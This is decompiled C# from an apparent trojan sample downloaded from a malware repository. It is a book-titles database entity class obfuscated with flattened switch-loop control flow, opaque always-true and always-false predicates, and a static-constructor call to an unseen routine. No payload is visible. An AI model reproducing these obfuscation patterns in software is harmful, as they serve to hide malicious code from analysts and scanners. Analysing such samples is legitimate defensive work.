// Decompiled with JetBrains decompiler
// Type: ProjNet.Adapter.ComposerConsumerAdapter
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Linq;
using System.Data.Linq.Mapping;
using System.Runtime.CompilerServices;
using System.Threading;
using TYPELIBA.Identifiers;
using TYPELIBA.Importers;

namespace ProjNet.Adapter
{
  [Table(Name = "dbo.Titles")]
  public class ComposerConsumerAdapter : INotifyPropertyChanging, INotifyPropertyChanged
  {
    private static PropertyChangingEventArgs predicateProcess;
    private string _ISBN;
    private string _BookTitle;
    private int _EditionNumber;
    private string _Copyright;
    private EntitySet<DispatcherProcess> _AuthorISBNs;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ComposerConsumerAdapter()
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            this._AuthorISBNs = new EntitySet<DispatcherProcess>(new Action<DispatcherProcess>(this.RegisterRepository), new Action<DispatcherProcess>(this.PatchRepository));
            num = 5;
            continue;
          case 1:
          case 4:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 0;
          case 3:
            ManagerParamsID.NewExpression();
            if (true)
            {
              num = 4;
              continue;
            }
            goto label_6;
          case 5:
            goto label_7;
          default:
            num = 0;
            continue;
        }
      }
label_7:
      return;
label_6:;
    }

    [Column(CanBeNull = false, DbType = "VarChar(20) NOT NULL", IsPrimaryKey = true, Storage = "_ISBN")]
    public string ISBN
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._ISBN;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 1;
        while (true)
        {
          int num2 = num1;
          bool flag;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                goto label_6;
              case 1:
                flag = this._ISBN != value;
                num2 = 4;
                continue;
              case 2:
              case 5:
                goto label_2;
              case 4:
                if (flag)
                {
                  this.SendPropertyChanging();
                  num2 = 5;
                  continue;
                }
                goto label_10;
              case 6:
                goto label_9;
              default:
                goto label_5;
            }
          }
label_2:
          this._ISBN = value;
          goto label_6;
label_5:
          num1 = 0;
          continue;
label_6:
          this.SendPropertyChanged(nameof (ISBN));
          num1 = 6;
        }
label_10:
        return;
label_9:;
      }
    }

    [Column(CanBeNull = false, DbType = "VarChar(100) NOT NULL", Storage = "_BookTitle")]
    public string BookTitle
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._BookTitle;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 0;
        if (true)
          goto label_4;
label_1:
        bool flag = this._BookTitle != value;
        int num2 = 3;
label_3:
        num1 = num2;
label_4:
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_1;
            case 1:
            case 3:
              goto label_6;
            case 2:
            case 5:
              this.SendPropertyChanging();
              goto case 4;
            case 4:
              this._BookTitle = value;
              this.SendPropertyChanged(nameof (BookTitle));
              num1 = 6;
              continue;
            case 6:
              goto label_9;
            default:
              if (ComposerConsumerAdapter.StartCreator())
              {
                num1 = 4;
                continue;
              }
              goto label_6;
          }
        }
label_6:
        if (!flag)
          return;
        num2 = 5;
        goto label_3;
label_9:;
      }
    }

    [Column(DbType = "Int NOT NULL", Storage = "_EditionNumber")]
    public int EditionNumber
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._EditionNumber;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          bool flag;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                goto label_8;
              case 1:
                this.SendPropertyChanged(nameof (EditionNumber));
                if (true)
                {
                  num2 = 6;
                  continue;
                }
                goto label_8;
              case 2:
              case 5:
                this._EditionNumber = value;
                goto case 1;
              case 4:
                if (flag)
                {
                  this.SendPropertyChanging();
                  if (ComposerConsumerAdapter.StartCreator())
                  {
                    num2 = 5;
                    continue;
                  }
                  goto case 2;
                }
                else
                  goto label_10;
              case 6:
                goto label_9;
              default:
                if (true)
                {
                  num2 = 1;
                  continue;
                }
                goto case 1;
            }
          }
label_8:
          flag = this._EditionNumber != value;
          num1 = 4;
        }
label_10:
        return;
label_9:;
      }
    }

    [Column(CanBeNull = false, DbType = "VarChar(4) NOT NULL", Storage = "_Copyright")]
    public string Copyright
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._Copyright;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 1;
        while (true)
        {
          int num2;
          bool flag;
          switch (num1)
          {
            case 0:
            case 2:
              this._Copyright = value;
              goto case 3;
            case 1:
              flag = this._Copyright != value;
              num2 = 4;
              break;
            case 3:
            case 5:
              this.SendPropertyChanged(nameof (Copyright));
              if (true)
              {
                num1 = 6;
                continue;
              }
              goto case 1;
            case 4:
              if (flag)
              {
                this.SendPropertyChanging();
                num2 = 0;
                break;
              }
              goto label_11;
            case 6:
              goto label_9;
            default:
              num2 = 5;
              break;
          }
          num1 = num2;
        }
label_11:
        return;
label_9:;
      }
    }

    [Association(Name = "Title_AuthorISBN", OtherKey = "ISBN", Storage = "_AuthorISBNs", ThisKey = "ISBN")]
    public EntitySet<DispatcherProcess> AuthorISBNs
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._AuthorISBNs;
      [MethodImpl(MethodImplOptions.NoInlining)] set => this._AuthorISBNs.Assign((IEnumerable<DispatcherProcess>) value);
    }

    public event PropertyChangingEventHandler PropertyChanging
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 2;
        while (true)
        {
          PropertyChangingEventHandler changingEventHandler1;
          PropertyChangingEventHandler comparand;
          PropertyChangingEventHandler changingEventHandler2;
          int num2;
          switch (num1)
          {
            case 0:
            case 2:
              changingEventHandler1 = this.systemProcess;
              if (true)
              {
                num1 = 4;
                continue;
              }
              goto case 3;
            case 1:
            case 4:
              comparand = changingEventHandler1;
              num2 = 3;
              break;
            case 3:
              changingEventHandler2 = comparand + value;
              goto case 5;
            case 5:
              changingEventHandler1 = Interlocked.CompareExchange<PropertyChangingEventHandler>(ref this.systemProcess, changingEventHandler2, comparand);
              if (changingEventHandler1 == comparand)
              {
                num2 = 6;
                break;
              }
              goto case 1;
            case 6:
              goto label_6;
            default:
              int num3 = 5;
              num1 = ComposerConsumerAdapter.InitCreator() ? num3 : num3;
              continue;
          }
          num1 = num2;
        }
label_6:;
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 0;
        while (true)
        {
          int num2 = num1;
          PropertyChangingEventHandler changingEventHandler;
          while (true)
          {
            switch (num2)
            {
              case 0:
                changingEventHandler = this.systemProcess;
                if (true)
                {
                  num2 = 5;
                  continue;
                }
                goto label_3;
              case 1:
              case 3:
                goto label_3;
              case 2:
              case 4:
                goto label_5;
              case 5:
                goto label_1;
              case 6:
                goto label_10;
              default:
                goto label_8;
            }
          }
label_1:
          PropertyChangingEventHandler comparand = changingEventHandler;
          num1 = 4;
          continue;
label_3:
          if (changingEventHandler == comparand)
          {
            num1 = 6;
            continue;
          }
          goto label_1;
label_5:
          changingEventHandler = Interlocked.CompareExchange<PropertyChangingEventHandler>(ref this.systemProcess, comparand - value, comparand);
          goto label_3;
label_8:
          num1 = 1;
        }
label_10:;
      }
    }

    public event PropertyChangedEventHandler PropertyChanged
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 4;
        while (true)
        {
          int num2 = num1;
          PropertyChangedEventHandler changedEventHandler1;
          PropertyChangedEventHandler comparand;
          PropertyChangedEventHandler changedEventHandler2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 4:
                goto label_8;
              case 1:
                changedEventHandler2 = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.m_InterceptorProcess, changedEventHandler1, comparand);
                if (changedEventHandler2 == comparand)
                {
                  if (true)
                  {
                    num2 = 6;
                    continue;
                  }
                  goto case 2;
                }
                else
                  goto label_7;
              case 2:
              case 5:
                changedEventHandler1 = comparand + value;
                goto case 1;
              case 3:
                goto label_7;
              case 6:
                goto label_9;
              default:
                goto label_6;
            }
          }
label_6:
          num1 = 1;
          continue;
label_7:
          comparand = changedEventHandler2;
          num1 = 5;
          continue;
label_8:
          changedEventHandler2 = this.m_InterceptorProcess;
          num1 = 3;
        }
label_9:;
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num = 2;
        if (true)
          goto label_4;
label_1:
        PropertyChangedEventHandler changedEventHandler1 = this.m_InterceptorProcess;
        if (ComposerConsumerAdapter.StartCreator())
        {
          num = 5;
          goto label_4;
        }
label_2:
        PropertyChangedEventHandler comparand = changedEventHandler1;
        PropertyChangedEventHandler changedEventHandler2 = comparand - value;
        if (!ComposerConsumerAdapter.InitCreator())
        {
          num = 1;
          goto label_4;
        }
label_3:
        changedEventHandler1 = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.m_InterceptorProcess, changedEventHandler2, comparand);
        goto label_6;
label_4:
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
              goto label_3;
            case 3:
            case 4:
              goto label_6;
            case 5:
              goto label_2;
            case 6:
              goto label_9;
            default:
              if (!ComposerConsumerAdapter.InitCreator())
              {
                num = 4;
                continue;
              }
              goto label_6;
          }
        }
label_9:
        return;
label_6:
        if (changedEventHandler1 == comparand)
        {
          num = 6;
          goto label_4;
        }
        else
          goto label_2;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual void SendPropertyChanging()
    {
      int num = 4;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            // ISSUE: reference to a compiler-generated field
            flag = this.systemProcess != null;
            num = 1;
            continue;
          case 1:
            if (!flag)
              goto label_2;
            else
              goto case 2;
          case 2:
          case 3:
            // ISSUE: reference to a compiler-generated field
            this.systemProcess((object) this, ComposerConsumerAdapter.predicateProcess);
            num = 5;
            continue;
          case 5:
            goto label_7;
          default:
            num = 3;
            continue;
        }
      }
label_2:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual void SendPropertyChanged(string res)
    {
      int num = 1;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            // ISSUE: reference to a compiler-generated field
            flag = this.m_InterceptorProcess != null;
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_7;
          case 2:
          case 4:
            // ISSUE: reference to a compiler-generated field
            this.m_InterceptorProcess((object) this, new PropertyChangedEventArgs(res));
            if (true)
            {
              num = 5;
              continue;
            }
            goto case 0;
          case 3:
            if (!flag)
              goto label_2;
            else
              goto case 2;
          case 5:
            goto label_7;
          default:
            if (!ComposerConsumerAdapter.InitCreator())
            {
              num = 4;
              continue;
            }
            goto case 2;
        }
      }
label_2:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RegisterRepository(DispatcherProcess ident)
    {
      this.SendPropertyChanging();
      ident.Title = this;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PatchRepository(DispatcherProcess res)
    {
      this.SendPropertyChanging();
      res.Title = (ComposerConsumerAdapter) null;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static ComposerConsumerAdapter()
    {
      ManagerParamsID.NewExpression();
      ComposerConsumerAdapter.predicateProcess = new PropertyChangingEventArgs(string.Empty);
    }

    internal static bool StartCreator() => true;

    internal static bool InitCreator() => false;
  }
}
